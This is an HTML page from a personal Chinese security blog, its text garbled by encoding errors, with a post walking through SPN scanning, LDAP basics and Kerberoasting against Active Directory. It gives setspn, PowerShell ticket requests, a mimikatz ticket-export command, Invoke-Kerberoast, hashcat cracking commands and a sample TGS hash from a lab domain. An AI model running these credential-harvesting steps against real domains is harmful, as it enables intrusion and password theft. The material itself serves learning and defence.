<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<title>Kimengunçš„å­¦ä¹ ä¹‹è·¯</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

<meta name="description" content="æŠŠå›å¿†æ‹¼å¥½ç»™ä½ "/>
<meta name="keywords" content="æŠŠå›å¿†æ‹¼å¥½ç»™ä½ "/>

<!-- Place favicon.ico and apple-touch-icon.png in the root directory -->
<link rel="shortcut icon" href="https://x1hy9.github.io/favicon.ico">

<link rel="stylesheet" href="https://x1hy9.github.io/styles/main.css">

<!-- Modernizr JS -->
<script src="https://x1hy9.github.io/media/scripts/modernizr-2.6.2.min.js"></script>
<!-- FOR IE9 below -->
<!--[if lt IE 9]>
<scripts src="https://x1hy9.github.io/media/scripts/respond.min.js"></scripts>
<![endif]-->

<!-- Comment -->



<!-- katex -->
<!--<link href="https://cdn.bootcss.com/KaTeX/0.11.1/katex.min.css" rel="stylesheet">-->

<link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">



</head>
<body>
    <div id="fh5co-offcanvas">
    <a href="#!" class="fh5co-close-offcanvas js-fh5co-close-offcanvas">
        <span><i class="icon-cross3"></i> <span>Close</span></span>
    </a>
    <div class="fh5co-bio">
        <figure>
            <img src="https://x1hy9.github.io/images/avatar.png" alt="Kimengunçš„å­¦ä¹ ä¹‹è·¯"
                 class="img-responsive">
        </figure>
        <a href="https://x1hy9.github.io/post/about/"><h3 class="heading">ABOUT ME</h3></a>
        <h2>Kimengunçš„å­¦ä¹ ä¹‹è·¯</h2>
        <p>æŠŠå›å¿†æ‹¼å¥½ç»™ä½ </p>
        <ul class="fh5co-social">
            
                <li>
                    
                </li>
            
                <li>
                    
                </li>
            
                <li>
                    
                </li>
            
                <li>
                    
                </li>
            
                <li>
                    
                </li>
            
        </ul>
    </div>

    <div class="fh5co-menu">

        <!-- æ ‡ç­¾ -->
        <div class="fh5co-box">
            <a href="https://x1hy9.github.io/tags/"><h3 class="heading">ğŸ‘‰æ ‡ç­¾</h3></a>
            <ul>
                
                    <li><a href="https://x1hy9.github.io/tag/CqRl_Aqha/">å†…ç½‘æ¸—é€</a></li>
                
            </ul>
        </div>
    </div>
</div>

<header id="fh5co-header">
    <div class="container-fluid">
        <div class="row">
            <a href="#" class="js-fh5co-nav-toggle fh5co-nav-toggle"><i></i></a>
            <ul class="fh5co-social">
                
                    <li>
                        <a href="/"
                        
                        >
                            é¦–é¡µ
                        </a>
                    </li>
                
                    <li>
                        <a href="/archives"
                        
                        >
                            å½’æ¡£
                        </a>
                    </li>
                
                    <li>
                        <a href="/tags"
                        
                        >
                            æ ‡ç­¾
                        </a>
                    </li>
                
                    <li>
                        <a href="/post/about"
                        
                        >
                            å…³äº
                        </a>
                    </li>
                
            </ul>
            <div class="col-lg-12 col-md-12 text-center">
                <h1 id="fh5co-logo">
                    <a href="https://x1hy9.github.io">Kimengunçš„å­¦ä¹ ä¹‹è·¯ </a>
                </h1>
            </div>
        </div>
    </div>
</header>


    <!--  <a href="#" class="fh5co-post-prev"><span>ğŸ‘ˆ Prev</span></a>-->
    <!--  <a href="#" class="fh5co-post-next"><span>Next ğŸ‘‰</span></a>-->

    <!-- ç­‰grideaå‡ºè‡ªå®šä¹‰é¡µé¢åŠŸèƒ½å†ä¼˜åŒ–ä¸€ä¸‹ -->
    
        <div class="container-fluid">
    <div class="row fh5co-post-entry single-entry">
        <article class="col-lg-8 col-lg-offset-2 col-md-8 col-md-offset-2 col-sm-8 col-sm-offset-2 col-xs-12 col-xs-offset-0">
            <figure class="animate-box">
                
                    <img src="https://x1hy9.github.io/post-images/nei-wang-shen-tou-zhong-kerberos-xie-yi-zhong-spn-de-ying-yong.jpg" alt="å†…ç½‘æ¸—é€ä¸­-Kerberosåè®®ä¸­SPNçš„åº”ç”¨" class="img-responsive">
                
            </figure>
            <span class="fh5co-meta animate-box">
                
                    <div class="tag-container">
                        
                            <a href="https://x1hy9.github.io/tag/CqRl_Aqha/" class="tag">å†…ç½‘æ¸—é€, </a>
                        
                    </div>
                
            </span>
            <h2 class="fh5co-article-title animate-box">å†…ç½‘æ¸—é€ä¸­-Kerberosåè®®ä¸­SPNçš„åº”ç”¨</h2>
            <ol class="breadcrumb fh5co-meta fh5co-date animate-box" style="margin-bottom:0; background-color:#f8f9fa">
                <li>2021-02-17</li>
                <li>1367å­—</li>
                <li>6 min read</li>
            </ol>

            <div class="col-lg-12 col-lg-offset-0 col-md-12 col-md-offset-0 col-sm-12 col-sm-offset-0 col-xs-12 col-xs-offset-0 text-left content-article">
                <div class="row">
                    <div class="col-md-12 animate-box post-content">
                        <p> <h2 id="11-spn">1.1 SPN</h2>
<p>SPNï¼šæœåŠ¡ä¸»ä½“åç§°ã€‚ä½¿ç”¨Kerberosé¡»ä¸ºæœåŠ¡å™¨æ³¨å†ŒSPNï¼Œå› æ­¤å¯ä»¥åœ¨å†…ç½‘ä¸­æ‰«æSPNï¼Œå¿«é€Ÿå¯»æ‰¾å†…ç½‘ä¸­æ³¨å†Œçš„æœåŠ¡ï¼ŒSPNæ‰«æå¯ä»¥è§„é¿åƒç«¯å£æ‰«æçš„ä¸ç¡®å®šæ€§æ¢æµ‹åŠ¨ä½œã€‚ä¸»è¦åˆ©ç”¨å·¥å…·æœ‰ï¼šsetspnã€GetUserSPNs.vbså’ŒRubeusã€‚<br>
aã€åˆ©ç”¨Windowsè‡ªå¸¦çš„setspnå·¥å…·ï¼Œæ™®é€šåŸŸç”¨æˆ·æƒé™æ‰§è¡Œå³å¯ï¼š</p>
<blockquote>
<p>setspn -T domain.com -Q <em>/</em></p>
</blockquote>
<p><img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613562992518-d52fce69-8ae3-4af8-a936-c8a10ac34528.png" alt="" loading="lazy"><br>
åœ¨ä¸Šè¿°æˆªå›¾ä¸­å¯ä»¥æ¸…æ™°çš„çœ‹åˆ°DCServeræœºå™¨ä¸Šè¿è¡Œäº†dnsæœåŠ¡ã€‚å¦‚æœç½‘å†…å­˜åœ¨mssqlï¼Œåˆ©ç”¨SPNæ‰«æä¹Ÿå¯ä»¥å¾—åˆ°ç›¸åº”çš„ç»“æœã€‚</p>
<h3 id="0x02-spnæ‰«æ">0x02 SPNæ‰«æ</h3>
<p>spnæ‰«æä¹Ÿå¯ä»¥å«æ‰«æKerberosæœåŠ¡å®ä¾‹åç§°ï¼Œåœ¨Active Directoryç¯å¢ƒä¸­å‘ç°æœåŠ¡çš„æœ€ä½³æ–¹æ³•æ˜¯é€šè¿‡â€œSPNæ‰«æâ€ã€‚é€šè¿‡è¯·æ±‚ç‰¹å®šSPNç±»å‹çš„æœåŠ¡ä¸»ä½“åç§°æ¥æŸ¥æ‰¾æœåŠ¡ï¼ŒSPNæ‰«ææ”»å‡»è€…é€šè¿‡ç½‘ç»œç«¯å£æ‰«æçš„ä¸»è¦å¥½å¤„æ˜¯SPNæ‰«æä¸éœ€è¦è¿æ¥åˆ°ç½‘ç»œä¸Šçš„æ¯ä¸ªIPæ¥æ£€æŸ¥æœåŠ¡ç«¯å£ã€‚SPNæ‰«æé€šè¿‡LDAPæŸ¥è¯¢å‘åŸŸæ§åˆ¶å™¨æ‰§è¡ŒæœåŠ¡å‘ç°ã€‚ç”±äºSPNæŸ¥è¯¢æ˜¯æ™®é€šKerberosç¥¨æ®çš„ä¸€éƒ¨åˆ†ï¼Œå› æ­¤å¦‚æœä¸èƒ½è¢«æŸ¥è¯¢ï¼Œä½†å¯ä»¥ç”¨ç½‘ç»œç«¯å£æ‰«ææ¥ç¡®è®¤ã€‚å¯¹åŸŸæ§åˆ¶å™¨å‘èµ·LDAPæŸ¥è¯¢ï¼Œè¿™æ˜¯æ­£å¸¸kerberosç¥¨æ®è¡Œä¸ºçš„ä¸€éƒ¨åˆ†ï¼Œå› æ­¤æŸ¥è¯¢SPNçš„æ“ä½œå¾ˆéš¾è¢«æ£€æµ‹</p>
<h4 id="1spnæ ¼å¼">1.SPNæ ¼å¼</h4>
<p>SPN = serviceclass â€œ/â€ hostname [â€œ:â€port] [â€œ/â€ servicename]<br>
serviceclass = mssql<br>
servicename =sql.bk.com<br>
å…¶ä¸­ï¼š<br>
serviceclass:æ ‡è¯†æœåŠ¡ç±»çš„å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚WebæœåŠ¡çš„www<br>
hostname:ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ˜¯ç³»ç»Ÿçš„åç§°ã€‚è¿™åº”è¯¥æ˜¯å…¨é™å®šåŸŸåï¼ˆFQDNï¼‰ã€‚<br>
port:ä¸€ä¸ªæ•°å­—ï¼Œæ˜¯è¯¥æœåŠ¡çš„ç«¯å£å·ã€‚<br>
servicename:ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå®ƒæ˜¯æœåŠ¡çš„ä¸“æœ‰åç§°ï¼ˆDNï¼‰ï¼ŒobjectGuidï¼ŒInternetä¸»æœºåæˆ–å…¨é™å®šåŸŸåï¼ˆFQDNï¼‰ã€‚<br>
æ³¨æ„: æœåŠ¡ç±»å’Œä¸»æœºæ˜¯å¿…éœ€å‚æ•°ï¼Œä½†Â ç«¯å£å’ŒæœåŠ¡åæ˜¯å¯é€‰çš„ï¼Œä¸»æœºå’Œç«¯å£ä¹‹é—´çš„å†’å·åªæœ‰å½“ç«¯å£å­˜åœ¨æ—¶æ‰éœ€è¦</p>
<h4 id="2å¸¸è§æœåŠ¡å’ŒspnæœåŠ¡å®ä¾‹åç§°">2.å¸¸è§æœåŠ¡å’ŒspnæœåŠ¡å®ä¾‹åç§°</h4>
<p>MSSQLSvc/adsmsSQLAP01.adsecurity.org:1433<br>
Exchange<br>
exchangeMDB/adsmsEXCAS01.adsecurity.org<br>
RDP<br>
TERMSERV/adsmsEXCAS01.adsecurity.org<br>
WSMan / WinRM / PS Remoting<br>
WSMAN/adsmsEXCAS01.adsecurity.org<br>
Hyper-V Host<br>
Microsoft Virtual Console Service/adsmsHV01.adsecurity.org<br>
VMWare VCenter<br>
STS/adsmsVC01.adsecurity.org</p>
<h1 id="ldapåè®®">LDAPåè®®</h1>
<p>LDAPå…¨ç§°æ˜¯Lightweight Directory Access Protocolï¼Œè½»é‡ç›®å½•è®¿é—®åè®®ã€‚æ˜¯ä¸€ç§ç”¨æ¥æŸ¥è¯¢ä¸æ›´æ–° Active Directory çš„ç›®å½•æœåŠ¡é€šä¿¡åè®®ã€‚AD åŸŸæœåŠ¡åˆ©ç”¨ LDAP å‘½åè·¯å¾„ï¼ˆLDAP naming pathï¼‰æ¥è¡¨ç¤ºå¯¹è±¡åœ¨ AD å†…çš„ä½ç½®ï¼Œä»¥ä¾¿ç”¨å®ƒæ¥è®¿é—® AD å†…çš„å¯¹è±¡ã€‚<br>
æ¬è¿daikerå¤§ä½¬æ–‡ç« ä¸­LDAPçš„ä»‹ç»: <a href="https://www.anquanke.com/post/id/195100?from=singlemessage#h2-1">https://www.anquanke.com/post/id/195100?from=singlemessage#h2-1</a><br>
<img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613564378225-1078dbe2-6532-44ce-9c2f-5fbffc6d13d2.png" alt="" loading="lazy"></p>
<ul>
<li>ç›®å½•æ ‘ï¼šå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œåœ¨ä¸€ä¸ªç›®å½•æœåŠ¡ç³»ç»Ÿä¸­ï¼Œæ•´ä¸ªç›®å½•ä¿¡æ¯é›†å¯ä»¥è¡¨ç¤ºä¸ºä¸€ä¸ªç›®å½•ä¿¡æ¯æ ‘ï¼Œæ ‘ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹æ˜¯ä¸€ä¸ªæ¡ç›®ã€‚</li>
<li>æ¡ç›®ï¼šæ¯ä¸ªæ¡ç›®å°±æ˜¯ä¸€æ¡è®°å½•ï¼Œæ¯ä¸ªæ¡ç›®æœ‰è‡ªå·±çš„å”¯ä¸€å¯åŒºåˆ«çš„åç§°ï¼ˆDNï¼‰ã€‚æ¯”å¦‚å›¾ä¸­çš„æ¯ä¸ªåœ†åœˆéƒ½æ˜¯ä¸€æ¡è®°å½•ã€‚</li>
<li>DN,RDN:æ¯”å¦‚è¯´ç¬¬ä¸€ä¸ªå¶å­æ¡ç›®ï¼Œä»–æœ‰ä¸€ä¸ªå”¯ä¸€å¯åŒºåˆ†çš„åç§°â€“ â€”</li>
<li>DN:uid=bob,ou=people,dc=acme,dc=orgã€‚ç±»ä¼¼äºæ–‡ä»¶ç›®å½•çš„ç›¸å¯¹è·¯å¾„ç»å¯¹è·¯å¾„ï¼Œä»–é™¤äº†æœ‰ä¸ªDNä¹‹å¤–ï¼Œè¿˜æœ‰ä¸ªRDNï¼Œä»–ä¸ç›®å½•ç»“æ„æ— å…³ï¼Œæ¯”å¦‚ä¹‹å‰å’±ä»¬æè¿‡çš„uid=bob,ou=people,dc=acme,dc=orgï¼Œä»–çš„RDNå°±æ˜¯uid=bob</li>
<li>å±æ€§ï¼šæè¿°æ¡ç›®å…·ä½“ä¿¡æ¯ã€‚æ¯”å¦‚ uid=bill,ou=people,dc=acme,dc=orgï¼Œä»–æœ‰å±æ€§name ä¸ºbillï¼Œå±æ€§ageä¸º11ï¼Œå±æ€§school ä¸ºxxã€‚</li>
</ul>
<figure data-type="image" tabindex="1"><img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613564376610-ea6dc241-eb73-43e9-9282-5f72091d4fa7.png" alt="" loading="lazy"></figure>
<h1 id="kerberoasting">Kerberoasting</h1>
<p>ä»‹ç» Kerberos çš„è®¤è¯æµç¨‹æ—¶è¯´åˆ°ï¼Œåœ¨ KRB_TGS_REP ä¸­ï¼ŒTGS ä¼šè¿”å›ç»™ Client ä¸€å¼ ç¥¨æ® STï¼Œè€Œ ST æ˜¯ç”± Client è¯·æ±‚çš„ Server ç«¯å¯†ç è¿›è¡ŒåŠ å¯†çš„ã€‚å½“ Kerberos åè®®è®¾ç½®ç¥¨æ®ä¸º RC4 æ–¹å¼åŠ å¯†æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡çˆ†ç ´åœ¨ Client ç«¯è·å–çš„ç¥¨æ® STï¼Œä»è€Œè·å¾— Server ç«¯çš„å¯†ç ã€‚<br>
ä¸‹å›¾ä¸ºè®¾ç½® Kerberos çš„åŠ å¯†æ–¹å¼ä¸ºRC4ï¼Œåœ¨åŸŸä¸­å¯ä»¥åœ¨åŸŸæ§çš„ã€Œæœ¬åœ°å®‰å…¨ç­–ç•¥ã€ä¸­è¿›è¡Œè®¾ç½®ï¼š<br>
<img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613564376496-12278a0b-e71b-4b15-a2de-a7e22282191f.png" alt="" loading="lazy"><br>
è®¾ç½®å®Œæˆä¹‹åè¿è¡Œé‡Œè¾“å…¥ã€Œgpupdateã€åˆ·æ–°ç»„ç­–ç•¥ï¼Œç­–ç•¥ç”Ÿæ•ˆã€‚</p>
<h2 id="kerberoastingæ”»å‡»æ–¹å¼ä¸€">Kerberoastingæ”»å‡»æ–¹å¼ä¸€</h2>
<p>è·å¾—æœ‰ä»·å€¼çš„SPN<br>
éœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p>
<table>
<thead>
<tr>
<th>è¯¥SPNæ³¨å†Œåœ¨åŸŸç”¨æˆ·å¸æˆ·(Users)ä¸‹åŸŸç”¨æˆ·è´¦æˆ·çš„æƒé™å¾ˆé«˜</th>
</tr>
</thead>
<tbody></tbody>
</table>
<p>1.è·å–SPN<br>
powershell:<a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1</a><br>
vbs:<a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs</a></p>
<table>
<thead>
<tr>
<th>1</th>
<th>cscript GetUserSPNs.vbs</th>
</tr>
</thead>
<tbody></tbody>
</table>
<p><img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613564377810-7553d523-9081-40a6-85cd-640e4a7b04e6.png" alt="" loading="lazy"><br>
2.æ ¹æ®æ‰«æå‡ºçš„ç»“æœä½¿ç”¨å¾®è½¯æä¾›çš„ç±» KerberosRequestorSecurityToken å‘èµ· kerberos è¯·æ±‚ï¼Œç”³è¯· ST ç¥¨æ®ã€‚</p>
<table>
<thead>
<tr>
<th>Add-Type -AssemblyName System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/Srv-Web-Kit.rootkit.org&quot;</th>
</tr>
</thead>
<tbody></tbody>
</table>
<p><img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613564377285-96827fe6-b74a-4654-8b79-999772370171.png" alt="" loading="lazy"><br>
3.Kerberos åè®®ä¸­è¯·æ±‚çš„ç¥¨æ®ä¼šä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œå¯ä»¥é€šè¿‡ klist å‘½ä»¤æŸ¥çœ‹å½“å‰ä¼šè¯å­˜å‚¨çš„ kerberos ç¥¨æ®ã€‚</p>
<table>
<thead>
<tr>
<th>klist</th>
</tr>
</thead>
<tbody></tbody>
</table>
<p><img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613564377544-e856427d-1eff-44b8-b969-1f99c62eb28e.png" alt="" loading="lazy"><br>
4.mimicatzå¯¼å‡º</p>
<table>
<thead>
<tr>
<th>rberos::list /export</th>
</tr>
</thead>
<tbody></tbody>
</table>
<p><img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613564376510-f9a81a18-3f70-466f-b6ae-9f0f235b6448.png" alt="" loading="lazy"><br>
5.çˆ†ç ´å¯†ç <br>
è„šæœ¬:<a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</a></p>
<table>
<thead>
<tr>
<th>python2 tgsrepcrack.py wordlist.txt 1-40a10000-jerry@MSSQLSvc~Srv-Web-Kit.rootkit.org-ROOTKIT.ORG.kirbi</th>
</tr>
</thead>
<tbody></tbody>
</table>
<h2 id="kerberoastingæ”»å‡»æ–¹å¼äºŒ">Kerberoastingæ”»å‡»æ–¹å¼äºŒ</h2>
<p>Kerberoastingæ”»å‡»æ–¹å¼ä¸€ä¸­éœ€è¦é€šè¿‡ mimikatz ä»å†…å­˜ä¸­å¯¼å‡ºç¥¨æ®ï¼ŒInvoke-Kerberoast é€šè¿‡æå–ç¥¨æ®ä¼ è¾“æ—¶çš„åŸå§‹å­—èŠ‚ï¼Œè½¬æ¢æˆ John the Ripper æˆ–è€… HashCat èƒ½å¤Ÿç›´æ¥çˆ†ç ´çš„å­—ç¬¦ä¸²ã€‚<br>
è‡ªåŠ¨å®ç°ï¼Œå¹¶ä¸”ä¸éœ€è¦mimikatzï¼Œæ™®é€šç”¨æˆ·æƒé™å³å¯ï¼Œå‚è€ƒèµ„æ–™<br>
<a href="http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/">http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</a><br>
è„šæœ¬åœ°å€ï¼š<a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1">https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1</a></p>
<p>| Import-module .\Invoke-Kerberoast.ps1Invoke-kerberoast -outputformat hashcat |fl |<br>
| --- |</p>
<p>â€“outputformat å‚æ•°å¯ä»¥æŒ‡å®šè¾“å‡ºçš„æ ¼å¼ï¼Œå¯é€‰ John the Ripper å’Œ Hashcat ä¸¤ç§æ ¼å¼<br>
<img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613564376663-d8583c68-58ac-49bf-a7ee-4a3b7c0e81e8.png" alt="" loading="lazy"><br>
åˆ©ç”¨hashcatçˆ†ç ´<br>
å·¥å…·ä¸‹è½½:<a href="https://github.com/hashcat/hashcat">https://github.com/hashcat/hashcat</a></p>
<table>
<thead>
<tr>
<th>hashcat64.exe  -m 13100 hash.txt dic.txt --force --show</th>
</tr>
</thead>
<tbody></tbody>
</table>
<p>hash.txtå†…å®¹</p>
<table>
<thead>
<tr>
<th>$krb5tgs<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>23</mn></mrow><annotation encoding="application/x-tex">23</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">3</span></span></span></span><em>dbadmin<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>o</mi><mi>o</mi><mi>t</mi><mi>k</mi><mi>i</mi><mi>t</mi><mi mathvariant="normal">.</mi><mi>o</mi><mi>r</mi><mi>g</mi></mrow><annotation encoding="application/x-tex">rootkit.org</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">o</span><span class="mord mathdefault">o</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord">.</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span></span></span></span>MSSQLSvc/Srv-Web-Kit.rootkit.org:1433</em>$d78f3a872b2e770bd7fed0a08386d791$2a356ecded8ad719cde070eb0c25bd1126dce5017acfb219135760a3890428da51667504789cb12c15fa61c71209ffc3ed0cd1d7e08cbeb4bb2bbc84d42bac53f4030bbf8fff011bcfcd76e2448f8b34f1431da0ba5f373c737d12004562b4242b099c2f27797cd682902f70f356f5fa629ea7c55458ebd230eaa19c56f596e1e1e6e2d37887bddca6243661c3d1d8e69420a3ab4427c56859d3858f6b4283fc268a1f4af161771d37858226a4d640f0cb45648760d7c5698cfbcc1e53003277e462937d09da38e8c1bfd698e6d6db5fc184fa9166c5bf8002cb061b53187612d597ad3a547b4a2b6cd474bcb894c6d1ff021299882dd4ba9d37fe5543bbb205b5941cb24891f3f1733dd012dda97a81d8cb0206bfca3b9ae8a0087466fb91b1bea820a3608f71eb90a50d46ca1944816242d75ddae569cdf33bad5fb8f5703c252dbfce22cfa8ab268d16671020044282f88119854a01500216364329e89b37367516d0f21f9d2f6b20b886e3a01424b90431ffc7782a21a6befe40514cdfb704c29a2bd25078e821209d914df46fb11c997c7cf9e0ec94c036466cd51351c132304ff8a2bbdd8120a955b7ef764169193c8915dc123d6c339a5c2d7bae301f0effdaaa604cc84a4f36f005bbbf64f1cb276b265fc953e7b3c09cdbc4ec102edd8907fcf812088e7ab7ab1d3d1efe07c899f9f590ee1a8fa7714e5b5e7b82b072aa46dae2bf9566cca99877932021b506ddb51e3162a576e155ff0c40e6eb1546b7713d355475c4df227864e4a3e7d12c3c0d6f1020f738b041c4717aa626ef8a3c9974bda28f2d058dfc2a90bd6aea7a6352c07999744e9b936b34b372ffd85153bec7ea17c80cab0ab0f165b638fc43917df16c8dc37d664d952cb615bbf95809bcc046761cefc39eb01b2b0160d31701ed33f3d9ffafafbf931c3f698ab57550da5fb50b009aa27e1dcb3fdfcf9d68b44882b065dedb15252c3762b2ff98c197e87f4a04831ed8dda78e71a9744a655fde06064a8a7b19caa0845436ceadc279e3d50fb21982d9303f96470705f85f4ab1544d54f2a39f98fc5bcab97ad124b7aeffb45ccb356c043ee2949bdffb1fe0607b608051bc300b736d1add8f2cf50f508fe8b3e624f1d512cff8ed1f894a2836ea9fc960c5a87933f793a1f059f51d640353e01eedfaf5b41a60ba2b779d7e27e29d83fc584cb3ad7c52d746c1fd1d8b38840d3533e9ab0dc96110d509ab41735253a3354c3bcaa97acde9f6f2d9abe6ca1cea1e4b9df500b0567215571d8360f5f55b1dda171c2db476e2888eee7dfefb9a22909729350a4307d1f606a5ddb615a29ea3b54194f216f92c2161e3d998044c811675e86f913140e0e2d290da20141a9fe488ea715c1562f6425e30b54261e44b8e83430456c2b11e08d227b209f4c992089d8ac633e59d0ccbe15e5c06</th>
</tr>
</thead>
<tbody></tbody>
</table>
<p>çˆ†ç ´ç»“æœ<br>
<img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613564376692-eef989aa-ad92-4f35-b711-836e51824235.png" alt="" loading="lazy"><br>
**</p>
 </p>
                    </div>
                </div>

                <div class="row">
                    <div class="col-md-12 animate-box">
                        
                            <div class="next-post">
                                <div class="next">ä¸‹ä¸€ç¯‡</div>
                                <a href="https://x1hy9.github.io/post/nei-wang-shen-tou-zhu-ji-fa-xian-ji-qiao/">
                                    <h3 class="post-title">
                                        å†…ç½‘æ¸—é€ä¸»æœºå‘ç°æŠ€å·§
                                    </h3>
                                </a>
                            </div>
                        
                    </div>
                </div>

                <div class="row">
    <div class="col-md-12 animate-box">
        
    </div>
</div>

            </div>

        </article>
    </div>
</div>

    

    <!-- è¿”å›é¡¶éƒ¨ -->
    <div class="back-to-top">
    
        <a href="#!" id="tool-toc" class="hidden-xs hidden-sm">
            <i class="fa fa-map"></i>
        </a>
        <br>
    
    <a href="#top" class="hidden-xs hidden-sm"><i class="fa fa-paper-plane"></i></a>
</div>

<div class="post-toc animated fadeInRight hidden-xs hidden-sm" style="display: none;">
    <ul class="markdownIt-TOC">
<li>
<ul>
<li><a href="#11-spn">1.1 SPN</a>
<ul>
<li><a href="#0x02-spn%E6%89%AB%E6%8F%8F">0x02 SPNæ‰«æ</a>
<ul>
<li><a href="#1spn%E6%A0%BC%E5%BC%8F">1.SPNæ ¼å¼</a></li>
<li><a href="#2%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E5%92%8Cspn%E6%9C%8D%E5%8A%A1%E5%AE%9E%E4%BE%8B%E5%90%8D%E7%A7%B0">2.å¸¸è§æœåŠ¡å’ŒspnæœåŠ¡å®ä¾‹åç§°</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="#ldap%E5%8D%8F%E8%AE%AE">LDAPåè®®</a></li>
<li><a href="#kerberoasting">Kerberoasting</a>
<ul>
<li><a href="#kerberoasting%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E4%B8%80">Kerberoastingæ”»å‡»æ–¹å¼ä¸€</a></li>
<li><a href="#kerberoasting%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E4%BA%8C">Kerberoastingæ”»å‡»æ–¹å¼äºŒ</a></li>
</ul>
</li>
</ul>

</div>


    
<footer id="fh5co-footer">
  <p>Powered by <a href="https://x1hy9.github.io" target="_blank">Gridea</a></p>
</footer>


    <!-- jQuery -->
<script src="https://x1hy9.github.io/media/scripts/jquery.min.js"></script>
<!-- img lazy load -->
<script src="https://x1hy9.github.io/media/scripts/jquery.lazyload.min.js"></script>
<!-- jQuery Easing -->
<script src="https://x1hy9.github.io/media/scripts/jquery.easing.1.3.js"></script>
<!-- Bootstrap -->
<script src="https://x1hy9.github.io/media/scripts/bootstrap.min.js"></script>
<!-- Waypoints -->
<script src="https://x1hy9.github.io/media/scripts/jquery.waypoints.min.js"></script>
<!-- Main JS -->
<script src="https://x1hy9.github.io/media/scripts/main.js"></script>
<!-- Md5 Min JS -->
<script src="https://x1hy9.github.io/media/scripts/md5.min.js"></script>
<!-- katex -->
<!--<script src="https://cdn.bootcss.com/KaTeX/0.11.1/katex.min.js"></script>-->
<!-- highlight -->
<script src="https://cdn.bootcss.com/highlight.js/9.15.8/highlight.min.js"></script>


<script type="application/javascript">
    // ä»£ç é«˜äº®
    hljs.initHighlightingOnLoad();

    // img æ‡’åŠ è½½
    $(function () {
        $("img.lazy").lazyload({
            effect: "fadeIn",  // æ‡’åŠ è½½åŠ¨ç”»
            threshold: 180  // åœ¨å›¾ç‰‡è·ç¦»å±å¹•180pxæ—¶æå‰è½½å…¥
        });
        // tooltip
        $('[data-toggle="tooltip"]').tooltip();

        // ç›®å½•
        $('#tool-toc').click(function () {
            $('.post-toc').toggle();
        });
    });

    
</script>




</body>
</html>
